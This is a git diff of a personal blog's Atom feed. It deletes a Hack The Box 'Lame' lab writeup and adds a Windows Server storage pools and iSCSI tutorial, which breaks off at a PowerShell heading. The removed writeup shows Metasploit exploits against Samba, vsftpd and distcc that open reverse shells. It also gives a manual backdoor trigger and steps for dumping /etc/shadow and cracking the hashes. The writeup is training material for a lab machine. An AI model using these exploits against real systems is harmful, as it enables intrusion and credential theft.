@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-23T14:53:17-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-23T14:58:37-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
 </subtitle><author><name>Zack Jones</name></author><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://localhost:4000/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://localhost:4000/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://localhost:4000/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
 &lt;p&gt;If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience &lt;a href=&quot;/blog/2020/09/03/Resume.html&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
 
@@ -53,278 +53,7 @@ I also realized that the curriculum was extremely dry for a room of teens hoping
   &lt;li&gt;Google how to enumerate each port you find. Make notes.&lt;/li&gt;
   &lt;li&gt;Write what you’ve done. Take the time to do this. Write the most basic version of what your process was like. A few weeks or months later, go back to edit the notes, forcing you to follow them and re-work the box.&lt;/li&gt;
   &lt;li&gt;Publish things and have a professional critique your process.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;h1 id=&quot;lame&quot;&gt;Lame&lt;/h1&gt;
-
-&lt;p&gt;Linux machine&lt;/p&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;nmap&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 -p- 10.10.10.3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;ports&quot;&gt;ports&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:09 EDT
- Nmap scan report for 10.10.10.3
- Host is up (0.093s latency).
- Not shown: 65530 filtered ports
- PORT     STATE SERVICE     VERSION
- 21/tcp   open  ftp         3
- |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
- | ftp-syst: 
- |   STAT: 
- | FTP server status:
- |      Connected to 10.10.14.17
- |      Logged in as ftp
- |      TYPE: ASCII
- |      No session bandwidth limit
- |      Session timeout in seconds is 300
- |      Control connection is plain text
- |      Data connections will be plain text
- |      vsFTPd 2.3.4 - secure, fast, stable
- |_End of status
- 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- | ssh-hostkey: 
- |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
- |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
- 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
- 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
- Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
- Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.27 - 2.6.28 (92%)
- No exact OS matches for host (test conditions non-ideal).
- Network Distance: 2 hops
- Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
- 
- Host script results:
- |_clock-skew: mean: -3d00h52m25s, deviation: 2h49m43s, median: -3d02h52m26s
- | smb-os-discovery: 
- |   OS: Unix (Samba 3.0.20-Debian)
- |   Computer name: lame
- |   NetBIOS computer name: 
- |   Domain name: hackthebox.gr
- |   FQDN: lame.hackthebox.gr
- |_  System time: 2020-05-08T20:18:55-04:00
- | smb-security-mode: 
- |   account_used: &amp;lt;blank&amp;gt;
- |   authentication_level: user
- |   challenge_response: supported
- |_  message_signing: disabled (dangerous, but default)
- |_smb2-time: Protocol negotiation failed (SMB2)
- 
- TRACEROUTE (using port 445/tcp)
- HOP RTT      ADDRESS
- 1   91.69 ms 10.10.14.1
- 2   91.99 ms 10.10.10.3
- 
- OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
- Nmap done: 1 IP address (1 host up) scanned in 158.53 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;smb-enum&quot;&gt;smb enum&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\\10.10.10.3.\\
-allows for anon login try tmp
-smbclient \\\10.10.10.3\\tmp
-ls
-Nothing worth looking at. 
-version - samba 3.0.20-Debian  -from nmap scan.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;See if there are exploits on that SMB version.&lt;/p&gt;
-
-&lt;p&gt;found a module.&lt;/p&gt;
-
-&lt;h2 id=&quot;smb-exploit&quot;&gt;SMB Exploit&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/multi/samba/usermap_script
- msf5 exploit(multi/samba/usermap_script) &amp;gt; options
- 
- Module options (exploit/multi/samba/usermap_script):
- 
- Name    Current Setting  Required  Description
- ----    ---------------  --------  -----------
- RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
- RPORT   139              yes       The target port (TCP)
- 
- 
- Exploit target:
- 
- Id  Name
- --  ----
- 0   Automatic
- 
- 
- msf5 exploit(multi/samba/usermap_script) &amp;gt; set rhost 10.10.10.3
- rhost =&amp;gt; 10.10.10.3
- msf5 exploit(multi/samba/usermap_script) &amp;gt; run
- 
- [*] Started reverse TCP double handler on 10.10.14.17:4444 
- [*] Accepted the first client connection...
- [*] Accepted the second client connection...
- [*] Command: echo uoDexrJBt0bwYHdC;
- [*] Writing to socket A
- [*] Writing to socket B
- [*] Reading from sockets...
- [*] Reading from socket B
- [*] B: &quot;uoDexrJBt0bwYHdC\r\n&quot;
- [*] Matching...
- [*] A is input...
- [*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46751) at 2020-05-11 23:14:41 -0400
- 
- 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;shell&quot;&gt;Shell&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whoami
- root
- hostname
- lame
- cd root
- updatedb
- locate root.txt
- /root/root.txt
- pwd
- /root
- cat root.txt
- 92caac3be140ef409e45721348a4e9df
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;post-exploit&quot;&gt;Post exploit&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /etc/passwd
-copy this and save it
-then get shadow
-cat /etc/shadow/
-grab the hashes and save them. 
-Run unshadow on the files you've made
-use hashcat against the unshadow file
---------------------------------------
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;other-vulns&quot;&gt;Other Vulns&lt;/h1&gt;
-
-&lt;h2 id=&quot;check-the-ftp-version-for-exploits-ftp-version-vsftpd-234-has-metasploit-exploit&quot;&gt;check the ftp version for exploits. FTP version vsFTPd 2.3.4 has metasploit exploit.&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
- msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show targets
- 
- Exploit targets:
- 
- Id  Name
- --  ----
- 0   Automatic
- 
- 
- msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; options
- 
- Module options (exploit/unix/ftp/vsftpd_234_backdoor):
- 
- Name    Current Setting  Required  Description
- ----    ---------------  --------  -----------
- RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
- RPORT   21               yes       The target port (TCP)
- 
- 
- Exploit target:
- 
- Id  Name
- --  ----
- 0   Automatic
- 
- 
- msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set rhosts 10.10.10.3
- rhosts =&amp;gt; 10.10.10.3
- msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; run
- 
- [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
- [*] 10.10.10.3:21 - USER: 331 Please specify the password.
- [*] Exploit completed, but no session was created.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;manual-exploit&quot;&gt;Manual exploit&lt;/h2&gt;
-
-&lt;p&gt;found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200&lt;/p&gt;
-
-&lt;p&gt;Manual exploit reference.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/&quot;&gt;Exploit vsftpd version 2.3.4&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$telnet 10.10.10.3 21
- Trying 10.10.10.3...
- Connected to 10.10.10.3.
- Escape character is '^]'.
- 220 (vsFTPd 2.3.4)
- USER WillThisWork: )
- 331 Please specify the password.
- PASS lolololol
- 530 Login incorrect.
- ^]
- telnet&amp;gt; quit
- Connection closed.
- 
-$nmap -A -Pn -p 6200 10.10.10.3
- Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:41 EDT
- Nmap scan report for 10.10.10.3
- Host is up.
- 
- PORT     STATE    SERVICE VERSION
- 6200/tcp filtered lm-x
- 
- Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
- Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;distcc-metasploit-exploit&quot;&gt;DistCC Metasploit exploit&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/misc/distcc_exec
-msf5 exploit(unix/misc/distcc_exec) &amp;gt; options
-
-Module options (exploit/unix/misc/distcc_exec):
-
-Name    Current Setting  Required  Description
-----    ---------------  --------  -----------
-RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
-RPORT   3632             yes       The target port (TCP)
-
-Exploit target:
-
-Id  Name
---  ----
-0   Automatic Target
-
-msf5 exploit(unix/misc/distcc_exec) &amp;gt; set rhosts 10.10.10.3
-rhosts =&amp;gt; 10.10.10.3
-msf5 exploit(unix/misc/distcc_exec) &amp;gt; show targets
-
-Exploit targets:
-
-Id  Name
---  ----
-0   Automatic Target
-
-msf5 exploit(unix/misc/distcc_exec) &amp;gt; run
-
-[*] Started reverse TCP double handler on 10.10.14.17:4444 
-[*] Accepted the first client connection...
-[*] Accepted the second client connection...
-[*] Command: echo m93VaQ0EKR7SGV6V;
-[*] Writing to socket A
-[*] Writing to socket B
-[*] Reading from sockets...
-[*] Reading from socket B
-[*] B: &quot;m93VaQ0EKR7SGV6V\r\n&quot;
-[*] Matching...
-[*] A is input...
-[*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400
-
-whoami
-daemon
-pwd
-/tmp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Lame</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;
 
@@ -1429,4 +1158,177 @@ If there are any issues, use the report to help you sovle them before moving for
   &lt;li&gt;On the Cluster Parameters page, type the full internet name for the cluster, and then set operation mode to either Unicast or Multicast, etc.&lt;/li&gt;
   &lt;li&gt;Set any applicable port rules&lt;/li&gt;
   &lt;li&gt;Now just add hosts to this cluster as needed.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Before you can Implement Network Load Balancing, here are some prerequisites:</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Before you can Implement Network Load Balancing, here are some prerequisites:</summary></entry><entry><title type="html">Implementing Server Storage Spaces</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html" rel="alternate" type="text/html" title="Implementing Server Storage Spaces" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html">&lt;h3 id=&quot;software-defined-storage--storage-pools&quot;&gt;Software Defined Storage &amp;amp; Storage Pools&lt;/h3&gt;
+&lt;p&gt;Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.&lt;/p&gt;
+
+&lt;p&gt;Storage pools are a type of software defined storage system that takes multiple physical devices and creates a single Pool resource to create virtual ‘logical’ volumes from. Imagine having 3 harddrives 2 GB a piece. Then you collect their storage capabilities together to then create something like 2 VHDs with 3GB of space each. This is &lt;em&gt;sort of&lt;/em&gt; how Storage Pools work.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+|--------------------------|--------------------------|
+|                          |                          |
+|          3GB             |          3GB             | ----- Logical Volumes
+|                          |                          |
+|--------------------------|--------------------------|
+|-----------------------------------------------------|
+|                                                     |
+|                         6GB                         | ----- Volume Pool
+|                                                     |
+|-----------------------------------------------------|
+|-----------------|-----------------|-----------------|
+|                 |                 |                 |
+|       2GB       |       2GB       |       2GB       | ----- Physical Volumes
+|                 |                 |                 |
+|-----------------|-----------------|-----------------|
+
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are ways to arrange the pool’s resources such that instead of just adding up all the space, you use some of the space as a redudant system to create a failsafe. Pools can allow for a drive to completely fail and the data saved onto that logical volume still be accessible.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: this look familiar if you’ve used LVM before. Same concepts. It’s all software defined storage.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;adding-the-feature&quot;&gt;Adding the Feature&lt;/h3&gt;
+
+&lt;p&gt;As done before, make sure that the File and Storage Services feature is installed from the Server Manager &amp;gt; Manage &amp;gt; Add Roles and Features.&lt;/p&gt;
+
+&lt;h3 id=&quot;configuring-storage-pools-and-storage-spaces&quot;&gt;Configuring Storage Pools and Storage Spaces&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;In Server Manager head to File and Storage Services&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/2.png&quot; alt=&quot;Go to file and storage services&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Select the Storage Pools option from the left menu&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/3.png&quot; alt=&quot;Go to Storage pools&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;In the top right corner select TASKS and then New Storage Pool&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/4.png&quot; alt=&quot;go to tasks and new storage pool&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Now give this new pool a name and select which group of disks you’d like to use.
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/5.png&quot; alt=&quot;name it&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Now you should be able to add the disk you’d like to use in this pool. You have options for allocation for setting up hot swaps if needed. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/6.png&quot; alt=&quot;add physical disks (you need three for RAID5)&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Review the summary and click create&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/7.png&quot; alt=&quot;confirm&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;creating-volumes-in-the-pool&quot;&gt;Creating volumes in the pool&lt;/h3&gt;
+
+&lt;p&gt;Now that your physical drives are being used in a pool, you’ll need to create logical volumes or virtual drives to be able to utilize the storage.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-virtual-disk-in-the-pool&quot;&gt;Creating a Virtual Disk in the Pool&lt;/h3&gt;
+&lt;p&gt;So now you can see that you have a new storage pool but under it there is a section for Virtual Disks, and it’s empty.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Click Tasks and click create new virtual disk. Or you can click the &lt;em&gt;New Virtual Disk Wizard&lt;/em&gt; link within the virtual disk section. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/8.png&quot; alt=&quot;New Virtual Disk Wizard Link&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;It will then ask you to select the pool that you’d like to use. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/10.png&quot; alt=&quot;Selecting a pool&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;This next section is the layout section. Choose between:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Simple - no fail safe, allows for the most space usage
+Mirror - Drive is mirror onto other drives so if a failure happens, it can be found on another drive. *(this comes in a two way or three way flavor. Allowing for two drives to fail)*
+Parity - Works against single drive failures. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/11.png&quot; alt=&quot;Selecting Layout&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Select if you’d like to thin provision or a typical fixed provision. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/12.png&quot; alt=&quot;Privisioning Type setup&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;set the drive’s size.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/13.png&quot; alt=&quot;Selecting Size&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now just review your options before you finish. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/14.png&quot; alt=&quot;Confirm options&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;The Wizard will now create your virtual disk and you should be able to find it in the Server Manager under the File and Storage Manager. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/15.png&quot; alt=&quot;New Virtual Disk in Manager&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;iscsi-storage&quot;&gt;iSCSI Storage&lt;/h2&gt;
+&lt;p&gt;With iSCSI you will have the iSCSI disk, target, and initiator. This can be very confusing at first. Let’s clear that up.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disk&lt;/strong&gt; - The disk does not mean that it’s a physical iSCSI disk. What we are talking about is a VHD that is setup to communication using iSCSI&lt;br /&gt;
+&lt;strong&gt;Target&lt;/strong&gt; - The target is esentailly the iSCSI server. It will be where machines communicate to access the iSCSI resource.&lt;br /&gt;
+&lt;strong&gt;Initiator&lt;/strong&gt; - these are the machines on the network that ‘initiate’ a connection to the &lt;em&gt;Target&lt;/em&gt; to get access to the iSCSI Drive.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-iscsi-virtual-disk&quot;&gt;Creating a iSCSI Virtual Disk&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I’ll be skipping the iSCSI Role installation. The specific option you will want is the &lt;strong&gt;&lt;em&gt;iSCSI Services&lt;/em&gt;&lt;/strong&gt; with the &lt;strong&gt;&lt;em&gt;iSCSI Target Server&lt;/em&gt;&lt;/strong&gt; selection&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In the iSCSI section of the File and Storage Services Server Manager interface. Click &lt;em&gt;TASKS&lt;/em&gt; and create a new iSCSI Virtual Disk&lt;/li&gt;
+  &lt;li&gt;Select the volume you’d like to use.&lt;/li&gt;
+  &lt;li&gt;Give it a name&lt;/li&gt;
+  &lt;li&gt;Select the size and the space allocation type.&lt;/li&gt;
+  &lt;li&gt;You’ll now start making the Target. Click New iSCSI target&lt;/li&gt;
+  &lt;li&gt;Give it a name. You can use the &lt;em&gt;lon&lt;/em&gt; naming convention to help keep things organized.&lt;/li&gt;
+  &lt;li&gt;You will now add the iniatiator. Remember the initiator is the machine that will access this drive. You can add it by it’s name on the domain or by it’s IP address. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/16.png&quot; alt=&quot;Setting up Initator&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: The iniatiator will actually have to iniate the connection. This is just setting up who can be iniatiators.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You can setup CHAP to authenticate. This is a good security measure but doesn’t have to be setup for it to work. In the lab, you can skip this.&lt;/li&gt;
+  &lt;li&gt;Review your setup and complete.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You’ll see that the iSCSI section of the File and Storage Services will show that it clears the disk and then shows who is connected to it. For now it shouldn’t be connected to anyone.&lt;/p&gt;
+
+&lt;h3 id=&quot;iscsi-initiator&quot;&gt;iSCSI Initiator&lt;/h3&gt;
+&lt;p&gt;On another machine that you’d like to access the iSCSI drive from. You will use the iSCSI Initiator application to make this connection. You can find this in Tools within the Server Manager or you can search for it in the start bar on other Windows machines.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;For your target, enter in either the host name with the domain, or use it’s IP address to search for that machine under quick connect.&lt;/li&gt;
+  &lt;li&gt;If you setup the Initiator in the previous section. You should see &lt;em&gt;Login Succeeded.&lt;/em&gt; in the Progress Report section.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: before accessing the iSCSI drive, you will have to bring it online in Disk Management. It will not have allocated space and it will not be initialized as a disk. Set up this disk like a typical disk and give it a new volume before you can access it. &lt;em&gt;See my post on volumes to see more on how to do this&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You’re done!&lt;/p&gt;
+
+&lt;h3 id=&quot;giving-your-iscsi-isns-domain-set-and-zone&quot;&gt;Giving your iSCSI iSNS Domain set and zone.&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;You can setup an iSNS server to give your iSCSI targets a domain name on your network. iSNS creates nodes with targets, disks, and initiators. You can give them zones and sets within the Domain called Discovery Domains. I won’t cover this now but it can be pretty useful.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;storage-replica&quot;&gt;Storage Replica&lt;/h2&gt;
+&lt;p&gt;Storage Replica is a feature that allows two servers create a complete block level copy over SMB between two drives. AKA a image quality copy over the network. It doesn’t use a snapshot type technology, but constantly sends data over. This is good for disastery recovery and for log backups, databases, etc.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This is not drive sharing. This is creating a copy of a drive from one drive to another.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;add-the-feature-first&quot;&gt;Add the feature first&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;In Add Roles and Features. Find and add Storage Relica.&lt;/li&gt;
+  &lt;li&gt;On the server you are creating a replica with. Do the same process.&lt;/li&gt;
+  &lt;li&gt;reboot both machines.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;configuring-in-powershell&quot;&gt;Configuring in Powershell&lt;/h3&gt;
+&lt;p&gt;There aren’t any GUI options for Storage Replica. You’ll have to do this in powershell.&lt;/p&gt;
+
